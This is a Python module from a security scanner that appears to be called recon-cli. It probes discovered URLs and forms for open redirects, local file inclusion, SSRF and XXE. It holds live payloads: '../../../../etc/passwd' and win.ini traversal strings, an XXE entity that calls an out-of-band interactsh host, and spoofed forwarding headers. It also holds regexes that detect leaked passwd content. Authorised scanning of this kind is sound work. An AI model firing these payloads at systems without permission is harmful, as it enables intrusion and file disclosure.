from __future__ import annotations

import json
import re
import time
import uuid
from collections import defaultdict
from typing import Dict, List, Optional, Set, Tuple
from urllib.parse import parse_qsl, unquote, urlencode, urlparse, urlunparse

from recon_cli.pipeline.context import PipelineContext
from recon_cli.pipeline.stage_base import Stage, note_missing_tool
from recon_cli.utils.jsonl import read_jsonl
from recon_cli.utils.oast import InteractshSession


class ExtendedValidationStage(Stage):
    name = "extended_validation"

    REDIRECT_PARAMS = {"next", "redirect", "return", "url", "dest", "callback"}
    SSRF_PARAMS = {"url", "uri", "link", "host", "domain", "site", "callback", "dest"}
    LFI_PARAMS = {"file", "path", "page", "template", "include", "download", "doc"}
    HEADER_SSRF_HEADERS = (
        "X-Forwarded-Host",
        "X-Forwarded-Server",
        "X-Host",
        "X-Original-Host",
        "X-Forwarded-For",
    )

    LFI_LINUX_RE = re.compile(r"root:.*:0:0:", re.IGNORECASE)
    LFI_WIN_RE = re.compile(r"\\[(extensions|fonts|mci extensions)\\]", re.IGNORECASE)
    VALUE_DOMAIN_RE = re.compile(r"^[a-z0-9.-]+\\.[a-z]{2,}$", re.IGNORECASE)
    VALUE_FILE_RE = re.compile(r"\\.[a-z0-9]{2,5}$", re.IGNORECASE)

    def is_enabled(self, context: PipelineContext) -> bool:
        return bool(
            getattr(context.runtime_config, "enable_extended_validation", False)
        )

    def execute(self, context: PipelineContext) -> None:
        try:
            import requests
        except Exception:
            context.logger.warning("extended validation requires requests; skipping")
            return

        runtime = context.runtime_config
        enable_oast = bool(getattr(runtime, "enable_oast_validation", True))
        oast_backend = str(getattr(runtime, "oast_backend", "interactsh")).lower()
        enable_redirect = bool(getattr(runtime, "enable_redirect_validation", True))
        enable_lfi = bool(getattr(runtime, "enable_lfi_validation", True))
        enable_header = bool(getattr(runtime, "enable_header_validation", True))

        redirect_max_urls = int(getattr(runtime, "redirect_max_urls", 40))
        lfi_max_urls = int(getattr(runtime, "lfi_max_urls", 40))
        oast_max_targets = int(getattr(runtime, "oast_max_targets", 40))
        oast_max_per_host = int(getattr(runtime, "oast_max_per_host", 8))
        header_max_urls = int(getattr(runtime, "header_validation_max_urls", 30))
        timeout = int(getattr(runtime, "oast_timeout", 10))
        retry_count = int(getattr(runtime, "retry_count", 1))
        retry_backoff_base = float(getattr(runtime, "retry_backoff_base", 1.0))
        retry_backoff_factor = float(getattr(runtime, "retry_backoff_factor", 2.0))
        max_duration = max(
            0, int(getattr(runtime, "extended_validation_max_duration", 0) or 0)
        )
        max_total_probes = max(
            0, int(getattr(runtime, "extended_validation_max_probes", 0) or 0)
        )
        limiter = context.get_rate_limiter(
            "extended_validation",
            rps=float(getattr(runtime, "oast_rps", 0)),
            per_host=float(getattr(runtime, "oast_per_host_rps", 0)),
        )

        results_path = context.record.paths.results_jsonl
        if not results_path.exists():
            return

        signals = context.signal_index()
        candidates = self._collect_candidates(context, signals)
        if not candidates:
            context.logger.info("extended validation: no candidates")
            return

        artifacts_dir = context.record.paths.ensure_subdir("extended_validation")
        probes: List[Dict[str, object]] = []
        findings = 0
        confirmed_keys: Set[Tuple[str, str]] = set()
        stats = context.record.metadata.stats.setdefault("extended_validation", {})
        baseline_cache: Dict[Tuple[str, str, str, str], Tuple[int, str]] = {}
        started_at = time.monotonic()
        duration_cap_hit = False
        probe_cap_hit = False
        stop_requested = False

        def cap_reached() -> bool:
            nonlocal duration_cap_hit, probe_cap_hit, stop_requested
            if context.stop_requested():
                if not stop_requested:
                    context.logger.warning(
                        "extended validation stop requested; stopping stage work"
                    )
                stop_requested = True
                return True
            elapsed = int(time.monotonic() - started_at)
            if max_duration and elapsed >= max_duration:
                if not duration_cap_hit:
                    context.logger.warning(
                        "extended validation max duration reached (%ss); stopping stage work",
                        max_duration,
                    )
                duration_cap_hit = True
                return True
            if max_total_probes and len(probes) >= max_total_probes:
                if not probe_cap_hit:
                    context.logger.warning(
                        "extended validation max probes reached (%s); stopping stage work",
                        max_total_probes,
                    )
                probe_cap_hit = True
                return True
            return False

        # Redirect validation
        if enable_redirect and not cap_reached():
            redirect_candidates = candidates["redirect"][:redirect_max_urls]
            for entry in redirect_candidates:
                if cap_reached():
                    break
                url = entry["url"]
                if limiter and not limiter.wait_for_slot(url, timeout=timeout):
                    continue
                token = self._token()
                payload = f"https://example.com/{token}"
                test_url, method, data, json_body = self._prepare_payload_request(
                    entry, payload
                )
                if not context.url_allowed(test_url) or not test_url.startswith(
                    ("http://", "https://")
                ):
                    continue
                session = context.auth_session(test_url)
                headers = context.auth_headers(
                    {"User-Agent": "recon-cli redirect-validate"}
                )
                resp = self._request_with_retries(
                    requests,
                    session,
                    method,
                    test_url,
                    headers,
                    data,
                    json_body,
                    timeout,
                    False,
                    context.runtime_config.verify_tls,
                    retry_count,
                    retry_backoff_base,
                    retry_backoff_factor,
                )
                if resp is None:
                    if limiter:
                        limiter.on_error(test_url)
                    continue
                if limiter:
                    limiter.on_response(test_url, resp.status_code)
                location = resp.headers.get("Location", "")
                probes.append(
                    {
                        "type": "redirect_probe",
                        "url": test_url,
                        "param": entry["param"],
                        "payload": payload,
                        "status": resp.status_code,
                        "location": location,
                        "location_hint": entry.get("location", "query"),
                        "method": method,
                    }
                )
                if cap_reached():
                    break
                if resp.status_code in {
                    301,
                    302,
                    303,
                    307,
                    308,
                } and self._is_open_redirect(url, location, payload):
                    confirm_key = ("open_redirect", url)
                    if confirm_key in confirmed_keys:
                        continue
                    confirmed_keys.add(confirm_key)
                    signal_id = context.emit_signal(
                        "open_redirect_confirmed",
                        "url",
                        url,
                        confidence=0.8,
                        source="extended-validation",
                        tags=["redirect", "confirmed"],
                        evidence={"location": location},
                    )
                    finding = {
                        "type": "finding",
                        "finding_type": "open_redirect",
                        "source": "extended-validation",
                        "hostname": urlparse(url).hostname,
                        "url": url,
                        "description": "Open redirect confirmed via Location header",
                        "details": {"probe_url": test_url, "location": location},
                        "tags": ["redirect", "confirmed"],
                        "score": 80,
                        "priority": "high",
                        "severity": "high",
                        "evidence_id": signal_id or None,
                    }
                    if context.results.append(finding):
                        findings += 1

        # LFI validation
        if enable_lfi and not cap_reached():
            lfi_candidates = candidates["lfi"][:lfi_max_urls]
            for entry in lfi_candidates:
                if cap_reached():
                    break
                url = entry["url"]
                baseline_key = (
                    url,
                    str(entry.get("param") or ""),
                    str(entry.get("location") or "query"),
                    str(entry.get("method") or "get"),
                )
                baseline_status, baseline_body = baseline_cache.get(
                    baseline_key, (0, "")
                )
                if baseline_key not in baseline_cache:
                    baseline_status, baseline_body = self._fetch_baseline(
                        context,
                        requests,
                        entry,
                        timeout,
                        context.runtime_config.verify_tls,
                        retry_count,
                        retry_backoff_base,
                        retry_backoff_factor,
                        limiter,
                    )
                    baseline_cache[baseline_key] = (baseline_status, baseline_body)
                baseline_has_sig = bool(
                    baseline_body and self._looks_like_lfi(baseline_body)
                )
                for payload in (
                    "../../../../etc/passwd",
                    "..\\..\\..\\windows\\win.ini",
                ):
                    if cap_reached():
                        break
                    if limiter and not limiter.wait_for_slot(url, timeout=timeout):
                        continue
                    test_url, method, data, json_body = self._prepare_payload_request(
                        entry, payload
                    )
                    if not context.url_allowed(test_url) or not test_url.startswith(
                        ("http://", "https://")
                    ):
                        continue
                    session = context.auth_session(test_url)
                    headers = context.auth_headers(
                        {"User-Agent": "recon-cli lfi-validate"}
                    )
                    resp = self._request_with_retries(
                        requests,
                        session,
                        method,
                        test_url,
                        headers,
                        data,
                        json_body,
                        timeout,
                        True,
                        context.runtime_config.verify_tls,
                        retry_count,
                        retry_backoff_base,
                        retry_backoff_factor,
                    )
                    if resp is None:
                        if limiter:
                            limiter.on_error(test_url)
                        continue
                    if limiter:
                        limiter.on_response(test_url, resp.status_code)
                    body = (resp.text or "")[:4000]
                    probes.append(
                        {
                            "type": "lfi_probe",
                            "url": test_url,
                            "param": entry["param"],
                            "payload": payload,
                            "status": resp.status_code,
                            "location_hint": entry.get("location", "query"),
                            "method": method,
                        }
                    )
                    if cap_reached():
                        break
                    if baseline_has_sig:
                        continue
                    if (
                        resp.status_code < 400
                        and len(body) > 200
                        and self._looks_like_lfi(body)
                    ):
                        confirm_key = ("lfi", url)
                        if confirm_key in confirmed_keys:
                            continue
                        confirmed_keys.add(confirm_key)
                        signal_id = context.emit_signal(
                            "lfi_confirmed",
                            "url",
                            url,
                            confidence=0.8,
                            source="extended-validation",
                            tags=["lfi", "confirmed"],
                            evidence={"payload": payload},
                        )
                        finding = {
                            "type": "finding",
                            "finding_type": "lfi",
                            "source": "extended-validation",
                            "hostname": urlparse(url).hostname,
                            "url": url,
                            "description": "Local File Inclusion confirmed via response signature",
                            "details": {"probe_url": test_url, "payload": payload},
                            "tags": ["lfi", "confirmed"],
                            "score": 85,
                            "priority": "high",
                            "severity": "high",
                            "evidence_id": signal_id or None,
                        }
                        if context.results.append(finding):
                            findings += 1
                        break

        # OAST validation (SSRF / XXE)
        oast_tokens: Dict[str, Dict[str, object]] = {}
        interactions: List[Dict[str, object]] = []
        if enable_oast and oast_backend == "interactsh" and not cap_reached():
            oast_output = artifacts_dir / "interactsh.json"
            oast_domain_override = getattr(runtime, "oast_domain", None)
            session = InteractshSession(
                oast_output,
                logger=context.logger,
                wait_seconds=int(getattr(runtime, "oast_wait_seconds", 60)),
                poll_interval=int(getattr(runtime, "oast_poll_interval", 5)),
                timeout=8,
                domain_override=oast_domain_override,
            )
            if not session.start():
                context.logger.warning(
                    "OAST session failed to start; skipping SSRF/XXE validation"
                )
                note_missing_tool(context, "interactsh-client")
            else:
                try:
                    ssrf_candidates = candidates["ssrf"][:oast_max_targets]
                    per_host_counts: Dict[str, int] = defaultdict(int)
                    for entry in ssrf_candidates:
                        if cap_reached():
                            break
                        url = entry["url"]
                        host = urlparse(url).hostname or ""
                        if host and per_host_counts[host] >= oast_max_per_host:
                            continue
                        token = self._token()
                        oast_url = session.make_url(token)
                        if not oast_url:
                            continue
                        test_url, method, data, json_body = (
                            self._prepare_payload_request(entry, oast_url)
                        )
                        if not context.url_allowed(test_url) or not test_url.startswith(
                            ("http://", "https://")
                        ):
                            continue
                        if limiter and not limiter.wait_for_slot(
                            test_url, timeout=timeout
                        ):
                            continue
                        headers = context.auth_headers(
                            {"User-Agent": "recon-cli ssrf-validate"}
                        )
                        session_http = context.auth_session(test_url)
                        resp = self._request_with_retries(
                            requests,
                            session_http,
                            method,
                            test_url,
                            headers,
                            data,
                            json_body,
                            timeout,
                            True,
                            context.runtime_config.verify_tls,
                            retry_count,
                            retry_backoff_base,
                            retry_backoff_factor,
                        )
                        if resp is None:
                            if limiter:
                                limiter.on_error(test_url)
                            continue
                        if limiter:
                            limiter.on_response(test_url, resp.status_code)
                        per_host_counts[host] += 1
                        oast_tokens[token] = {
                            "type": "ssrf",
                            "url": url,
                            "param": entry["param"],
                            "probe": test_url,
                            "vector": entry.get("location", "query"),
                        }
                        probes.append(
                            {
                                "type": "ssrf_probe",
                                "url": test_url,
                                "param": entry["param"],
                                "oast_url": oast_url,
                                "status": resp.status_code,
                                "location_hint": entry.get("location", "query"),
                                "method": method,
                            }
                        )
                        if cap_reached():
                            break

                    xxe_candidates = candidates["xxe"][:oast_max_targets]
                    for entry in xxe_candidates:
                        if cap_reached():
                            break
                        url = entry["url"]
                        host = urlparse(url).hostname or ""
                        if host and per_host_counts[host] >= oast_max_per_host:
                            continue
                        token = self._token()
                        oast_url = session.make_url(token)
                        if not oast_url:
                            continue
                        method = entry.get("method", "post").upper()
                        xml_payload = self._xxe_payload(oast_url)
                        if limiter and not limiter.wait_for_slot(url, timeout=timeout):
                            continue
                        headers = context.auth_headers(
                            {
                                "User-Agent": "recon-cli xxe-validate",
                                "Content-Type": "application/xml",
                            }
                        )
                        session_http = context.auth_session(url)
                        resp = self._request_with_retries(
                            requests,
                            session_http,
                            method,
                            url,
                            headers,
                            xml_payload,
                            None,
                            timeout,
                            True,
                            context.runtime_config.verify_tls,
                            retry_count,
                            retry_backoff_base,
                            retry_backoff_factor,
                        )
                        if resp is None:
                            if limiter:
                                limiter.on_error(url)
                            continue
                        if limiter:
                            limiter.on_response(url, resp.status_code)
                        per_host_counts[host] += 1
                        oast_tokens[token] = {
                            "type": "xxe",
                            "url": url,
                            "method": method,
                            "probe": url,
                        }
                        probes.append(
                            {
                                "type": "xxe_probe",
                                "url": url,
                                "method": method,
                                "oast_url": oast_url,
                                "status": resp.status_code,
                            }
                        )
                        if cap_reached():
                            break

                    if enable_header and not cap_reached():
                        header_candidates = self._select_header_candidates(
                            candidates, header_max_urls
                        )
                        for url in header_candidates:
                            if cap_reached():
                                break
                            token = self._token()
                            oast_url = session.make_url(token)
                            if not oast_url:
                                continue
                            oast_host = self._oast_host(oast_url)
                            headers = context.auth_headers(
                                {"User-Agent": "recon-cli ssrf-header"}
                            )
                            for header_name in self.HEADER_SSRF_HEADERS:
                                headers[header_name] = oast_host
                            if limiter and not limiter.wait_for_slot(
                                url, timeout=timeout
                            ):
                                continue
                            session_http = context.auth_session(url)
                            resp = self._request_with_retries(
                                requests,
                                session_http,
                                "get",
                                url,
                                headers,
                                None,
                                None,
                                timeout,
                                True,
                                context.runtime_config.verify_tls,
                                retry_count,
                                retry_backoff_base,
                                retry_backoff_factor,
                            )
                            if resp is None:
                                if limiter:
                                    limiter.on_error(url)
                                continue
                            if limiter:
                                limiter.on_response(url, resp.status_code)
                            oast_tokens[token] = {
                                "type": "ssrf",
                                "url": url,
                                "param": "header",
                                "probe": url,
                                "vector": "header",
                            }
                            probes.append(
                                {
                                    "type": "ssrf_header_probe",
                                    "url": url,
                                    "oast_url": oast_url,
                                    "status": resp.status_code,
                                }
                            )
                            if cap_reached():
                                break

                    if oast_tokens and not cap_reached():
                        collected = session.collect_interactions(
                            list(oast_tokens.keys())
                        )
                        interactions = [interaction.raw for interaction in collected]
                        for interaction in collected:
                            info = oast_tokens.get(interaction.token)
                            if not info:
                                continue
                            signal_type = (
                                "ssrf_confirmed"
                                if info["type"] == "ssrf"
                                else "xxe_confirmed"
                            )
                            confirm_key = (info["type"], info["url"])
                            if confirm_key in confirmed_keys:
                                continue
                            confirmed_keys.add(confirm_key)
                            tags = [info["type"], "confirmed"]
                            if info.get("vector") == "header":
                                tags.append("header")
                            signal_id = context.emit_signal(
                                signal_type,
                                "url",
                                info["url"],
                                confidence=0.8,
                                source="extended-validation",
                                tags=tags,
                                evidence={"interaction": interaction.raw},
                            )
                            finding = {
                                "type": "finding",
                                "finding_type": info["type"],
                                "source": "extended-validation",
                                "hostname": urlparse(info["url"]).hostname,
                                "url": info["url"],
                                "description": f"{info['type'].upper()} confirmed via OAST interaction",
                                "details": {
                                    "probe": info.get("probe"),
                                    "vector": info.get("vector"),
                                    "interaction": interaction.raw,
                                },
                                "tags": [info["type"], "confirmed", "oast"]
                                + (
                                    ["header"] if info.get("vector") == "header" else []
                                ),
                                "score": 90,
                                "priority": "high",
                                "severity": "critical"
                                if info["type"] == "ssrf"
                                else "high",
                                "evidence_id": signal_id or None,
                            }
                            if context.results.append(finding):
                                findings += 1
                        if interactions:
                            for interaction in interactions:
                                context.emit_signal(
                                    "oast_interaction",
                                    "url",
                                    str(
                                        interaction.get("full-id")
                                        or interaction.get("url")
                                        or ""
                                    ),
                                    confidence=0.3,
                                    source="extended-validation",
                                    tags=["oast"],
                                    evidence=interaction,
                                )
                finally:
                    session.stop()

        # Save artifacts + stats
        artifact_path = artifacts_dir / "extended_validation.json"
        artifact_path.write_text(
            json.dumps(
                {
                    "probes": probes,
                    "interactions": interactions,
                    "findings": findings,
                },
                indent=2,
                sort_keys=True,
            ),
            encoding="utf-8",
        )
        elapsed_seconds = int(time.monotonic() - started_at)
        stats.update(
            {
                "probes": len(probes),
                "findings": findings,
                "elapsed_seconds": elapsed_seconds,
                "max_duration_seconds": max_duration,
                "duration_cap_hit": duration_cap_hit,
                "max_total_probes": max_total_probes,
                "probe_cap_hit": probe_cap_hit,
                "stop_requested": stop_requested,
                "artifact": str(artifact_path.relative_to(context.record.paths.root)),
            }
        )
        context.manager.update_metadata(context.record)

    def _collect_candidates(
        self, context: PipelineContext, signals: Dict[str, Dict[str, Set[str]]]
    ) -> Dict[str, List[Dict[str, object]]]:
        redirect_map: Dict[Tuple[str, str, str, str], Dict[str, object]] = {}
        ssrf_map: Dict[Tuple[str, str, str, str], Dict[str, object]] = {}
        lfi_map: Dict[Tuple[str, str, str, str], Dict[str, object]] = {}
        xxe_map: Dict[Tuple[str, str], Dict[str, object]] = {}
        for entry in read_jsonl(context.record.paths.results_jsonl):
            etype = entry.get("type")
            if etype == "url":
                url = entry.get("url")
                if not isinstance(url, str) or not url:
                    continue
                if not context.url_allowed(url) or not url.startswith(
                    ("http://", "https://")
                ):
                    continue
                host = urlparse(url).hostname or ""
                host_signals = signals.get("by_host", {}).get(host, set())
                if (
                    "waf_detected" in host_signals
                    and "waf_bypass_possible" not in host_signals
                ):
                    continue
                params = parse_qsl(urlparse(url).query, keep_blank_values=True)
                for key, value in params:
                    key_lower = key.lower()
                    score = int(entry.get("score", 0))
                    if isinstance(value, str) and value:
                        if key_lower in self.REDIRECT_PARAMS:
                            score = self._adjust_score(score, "redirect", value)
                        if key_lower in self.SSRF_PARAMS:
                            score = self._adjust_score(score, "ssrf", value)
                        if key_lower in self.LFI_PARAMS:
                            score = self._adjust_score(score, "lfi", value)
                    candidate_key = (url, key_lower, "query", "get")
                    if key_lower in self.REDIRECT_PARAMS:
                        redirect_map[candidate_key] = self._pick_best(
                            redirect_map.get(candidate_key),
                            {
                                "url": url,
                                "param": key,
                                "location": "query",
                                "method": "get",
                                "score": score,
                            },
                        )
                    if key_lower in self.SSRF_PARAMS:
                        ssrf_map[candidate_key] = self._pick_best(
                            ssrf_map.get(candidate_key),
                            {
                                "url": url,
                                "param": key,
                                "location": "query",
                                "method": "get",
                                "score": score,
                            },
                        )
                    if key_lower in self.LFI_PARAMS:
                        lfi_map[candidate_key] = self._pick_best(
                            lfi_map.get(candidate_key),
                            {
                                "url": url,
                                "param": key,
                                "location": "query",
                                "method": "get",
                                "score": score,
                            },
                        )
                tags = entry.get("tags", [])
                if "api:schema" in tags and any(
                    tag.startswith("method:") for tag in tags
                ):
                    method = "post"
                    for tag in tags:
                        if tag.startswith("method:"):
                            method = tag.split(":", 1)[1]
                    score = int(entry.get("score", 0))
                    xxe_key = (url, method)
                    xxe_map[xxe_key] = self._pick_best(
                        xxe_map.get(xxe_key),
                        {"url": url, "method": method, "score": score},
                    )
                    if method in {"post", "put", "patch"}:
                        redirect_key = (url, "url", "json", method)
                        ssrf_key = (url, "url", "json", method)
                        lfi_key = (url, "file", "json", method)
                        redirect_map[redirect_key] = self._pick_best(
                            redirect_map.get(redirect_key),
                            {
                                "url": url,
                                "param": "url",
                                "location": "json",
                                "method": method,
                                "score": score,
                            },
                        )
                        ssrf_map[ssrf_key] = self._pick_best(
                            ssrf_map.get(ssrf_key),
                            {
                                "url": url,
                                "param": "url",
                                "location": "json",
                                "method": method,
                                "score": score,
                            },
                        )
                        lfi_map[lfi_key] = self._pick_best(
                            lfi_map.get(lfi_key),
                            {
                                "url": url,
                                "param": "file",
                                "location": "json",
                                "method": method,
                                "score": score,
                            },
                        )
            elif etype == "parameter":
                name = entry.get("name")
                if not isinstance(name, str):
                    continue
                name_lower = name.lower()
                if name_lower not in (
                    self.REDIRECT_PARAMS | self.SSRF_PARAMS | self.LFI_PARAMS
                ):
                    continue
                examples = entry.get("examples") or []
                for example in examples:
                    if not isinstance(example, str) or not example:
                        continue
                    if not example.startswith(
                        ("http://", "https://")
                    ) or not context.url_allowed(example):
                        continue
                    host = urlparse(example).hostname or ""
                    host_signals = signals.get("by_host", {}).get(host, set())
                    if (
                        "waf_detected" in host_signals
                        and "waf_bypass_possible" not in host_signals
                    ):
                        continue
                    score = int(entry.get("score", 0))
                    example_value = self._extract_param_value(example, name)
                    if example_value:
                        if name_lower in self.REDIRECT_PARAMS:
                            score = self._adjust_score(score, "redirect", example_value)
                        if name_lower in self.SSRF_PARAMS:
                            score = self._adjust_score(score, "ssrf", example_value)
                        if name_lower in self.LFI_PARAMS:
                            score = self._adjust_score(score, "lfi", example_value)
                    candidate_key = (example, name_lower, "query", "get")
                    if name_lower in self.REDIRECT_PARAMS:
                        redirect_map[candidate_key] = self._pick_best(
                            redirect_map.get(candidate_key),
                            {
                                "url": example,
                                "param": name,
                                "location": "query",
                                "method": "get",
                                "score": score,
                            },
                        )
                    if name_lower in self.SSRF_PARAMS:
                        ssrf_map[candidate_key] = self._pick_best(
                            ssrf_map.get(candidate_key),
                            {
                                "url": example,
                                "param": name,
                                "location": "query",
                                "method": "get",
                                "score": score,
                            },
                        )
                    if name_lower in self.LFI_PARAMS:
                        lfi_map[candidate_key] = self._pick_best(
                            lfi_map.get(candidate_key),
                            {
                                "url": example,
                                "param": name,
                                "location": "query",
                                "method": "get",
                                "score": score,
                            },
                        )
            elif etype == "form":
                action = entry.get("action") or entry.get("url")
                if not isinstance(action, str) or not action:
                    continue
                if not context.url_allowed(action) or not action.startswith(
                    ("http://", "https://")
                ):
                    continue
                method = str(entry.get("method") or "post").lower()
                inputs = entry.get("inputs") or []
                if not isinstance(inputs, list):
                    continue
                for item in inputs:
                    if not isinstance(item, dict):
                        continue
                    name = item.get("name")
                    if not isinstance(name, str) or not name:
                        continue
                    name_lower = name.lower()
                    score = int(entry.get("score", 25))
                    location = "body" if method in {"post", "put", "patch"} else "query"
                    if name_lower in self.REDIRECT_PARAMS:
                        redirect_key = (action, name_lower, location, method)
                        redirect_map[redirect_key] = self._pick_best(
                            redirect_map.get(redirect_key),
                            {
                                "url": action,
                                "param": name,
                                "location": location,
                                "method": method,
                                "score": score,
                            },
                        )
                    if name_lower in self.SSRF_PARAMS:
                        ssrf_key = (action, name_lower, location, method)
                        ssrf_map[ssrf_key] = self._pick_best(
                            ssrf_map.get(ssrf_key),
                            {
                                "url": action,
                                "param": name,
                                "location": location,
                                "method": method,
                                "score": score,
                            },
                        )
                    if name_lower in self.LFI_PARAMS:
                        lfi_key = (action, name_lower, location, method)
                        lfi_map[lfi_key] = self._pick_best(
                            lfi_map.get(lfi_key),
                            {
                                "url": action,
                                "param": name,
                                "location": location,
                                "method": method,
                                "score": score,
                            },
                        )
        redirect = sorted(
            redirect_map.values(),
            key=lambda item: int(item.get("score", 0)),
            reverse=True,
        )
        ssrf = sorted(
            ssrf_map.values(), key=lambda item: int(item.get("score", 0)), reverse=True
        )
        lfi = sorted(
            lfi_map.values(), key=lambda item: int(item.get("score", 0)), reverse=True
        )
        xxe = sorted(
            xxe_map.values(), key=lambda item: int(item.get("score", 0)), reverse=True
        )
        return {"redirect": redirect, "ssrf": ssrf, "lfi": lfi, "xxe": xxe}

    @staticmethod
    def _token() -> str:
        return uuid.uuid4().hex[:10]

    @staticmethod
    def _inject_param(url: str, param: str, value: str) -> str:
        parsed = urlparse(url)
        params = parse_qsl(parsed.query, keep_blank_values=True)
        replaced = False
        updated: List[Tuple[str, str]] = []
        for key, val in params:
            if key == param and not replaced:
                updated.append((key, value))
                replaced = True
            else:
                updated.append((key, val))
        if not replaced:
            updated.append((param, value))
        new_query = urlencode(updated, doseq=True)
        return urlunparse(parsed._replace(query=new_query))

    def _prepare_payload_request(
        self,
        entry: Dict[str, object],
        payload: str,
    ) -> Tuple[str, str, Optional[Dict[str, str]], Optional[Dict[str, str]]]:
        url = entry["url"]
        param = entry["param"]
        location = entry.get("location", "query")
        method = str(entry.get("method") or "get").lower()
        if location == "query" or method == "get":
            return self._inject_param(url, param, payload), "get", None, None
        if location == "json":
            return url, method, None, {param: payload}
        # default to form body
        return url, method, {param: payload}, None

    def _is_open_redirect(self, original_url: str, location: str, payload: str) -> bool:
        if not location:
            return False
        token = payload.rsplit("/", 1)[-1]
        if payload not in location and (token and token not in location):
            return False
        try:
            parsed_original = urlparse(original_url)
            loc_value = location.strip()
            if loc_value.startswith("//"):
                loc_value = "http:" + loc_value
            parsed_location = urlparse(loc_value)
        except Exception:
            return False
        if not parsed_location.scheme or not parsed_location.netloc:
            return False
        if parsed_original.hostname and parsed_location.hostname:
            if parsed_original.hostname.lower() == parsed_location.hostname.lower():
                return False
        return True

    @staticmethod
    def _pick_best(
        existing: Optional[Dict[str, object]], candidate: Dict[str, object]
    ) -> Dict[str, object]:
        if not existing:
            return candidate
        if int(candidate.get("score", 0)) > int(existing.get("score", 0)):
            return candidate
        return existing

    @classmethod
    def _looks_like_lfi(cls, body: str) -> bool:
        if not body:
            return False
        if cls.LFI_LINUX_RE.search(body):
            return True
        if cls.LFI_WIN_RE.search(body):
            return True
        return False

    def _fetch_baseline(
        self,
        context: PipelineContext,
        requests_mod,
        entry: Dict[str, object],
        timeout: int,
        verify_tls: bool,
        retries: int,
        backoff_base: float,
        backoff_factor: float,
        limiter,
    ) -> Tuple[int, str]:
        test_url, method, data, json_body = self._prepare_payload_request(
            entry, "recon_baseline"
        )
        if not context.url_allowed(test_url):
            return 0, ""
        session = context.auth_session(test_url)
        headers = context.auth_headers({"User-Agent": "recon-cli lfi-baseline"})
        if limiter and not limiter.wait_for_slot(test_url, timeout=timeout):
            return 0, ""
        resp = self._request_with_retries(
            requests_mod,
            session,
            method,
            test_url,
            headers,
            data,
            json_body,
            timeout,
            True,
            verify_tls,
            retries,
            backoff_base,
            backoff_factor,
        )
        if resp is None:
            if limiter:
                limiter.on_error(test_url)
            return 0, ""
        if limiter:
            limiter.on_response(test_url, resp.status_code)
        return int(resp.status_code or 0), (resp.text or "")[:4000]

    @staticmethod
    def _xxe_payload(oast_url: str) -> str:
        return (
            '<?xml version="1.0"?>'
            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "' + oast_url + '">]>'
            "<foo>&xxe;</foo>"
        )

    @staticmethod
    def _oast_host(oast_url: str) -> str:
        parsed = urlparse(oast_url)
        if parsed.hostname:
            return parsed.hostname
        return oast_url.replace("http://", "").replace("https://", "").split("/")[0]

    @staticmethod
    def _select_header_candidates(
        candidates: Dict[str, List[Dict[str, object]]],
        limit: int,
    ) -> List[str]:
        urls: List[str] = []
        seen: Set[str] = set()
        for entry in candidates.get("ssrf", []):
            url = entry.get("url")
            if not url or url in seen:
                continue
            seen.add(url)
            urls.append(url)
            if limit > 0 and len(urls) >= limit:
                break
        return urls

    @staticmethod
    def _extract_param_value(url: str, name: str) -> str:
        try:
            params = parse_qsl(urlparse(url).query, keep_blank_values=True)
        except Exception:
            return ""
        for key, value in params:
            if key == name:
                return value
        return ""

    def _adjust_score(self, base_score: int, kind: str, value: str) -> int:
        if not value:
            return base_score
        raw = str(value)
        decoded = unquote(raw).strip()
        lower = decoded.lower()
        boost = 0
        if kind in {"redirect", "ssrf"}:
            if lower.startswith(("http://", "https://", "//")):
                boost += 12
            elif self.VALUE_DOMAIN_RE.match(lower):
                boost += 8
            elif decoded.isdigit() or lower in {"true", "false", "0", "1"}:
                boost -= 4
        elif kind == "lfi":
            if "/" in decoded or "\\" in decoded or ".." in decoded:
                boost += 8
            elif self.VALUE_FILE_RE.search(lower):
                boost += 5
            elif decoded.isdigit():
                boost -= 4
        return max(base_score + boost, 0)

    def _request_with_retries(
        self,
        requests_mod,
        session,
        method: str,
        url: str,
        headers: Dict[str, str],
        data: Optional[object],
        json_body: Optional[Dict[str, str]],
        timeout: int,
        allow_redirects: bool,
        verify_tls: bool,
        retries: int,
        backoff_base: float,
        backoff_factor: float,
    ):
        attempt = 0
        while attempt <= retries:
            try:
                if session:
                    return session.request(
                        method,
                        url,
                        data=data,
                        json=json_body,
                        timeout=timeout,
                        allow_redirects=allow_redirects,
                        headers=headers,
                        verify=verify_tls,
                    )
                return requests_mod.request(
                    method,
                    url,
                    data=data,
                    json=json_body,
                    timeout=timeout,
                    allow_redirects=allow_redirects,
                    headers=headers,
                    verify=verify_tls,
                )
            except requests_mod.exceptions.RequestException:
                if attempt >= retries:
                    return None
                delay = backoff_base * (backoff_factor**attempt)
                time.sleep(max(0.1, delay))
                attempt += 1
        return None
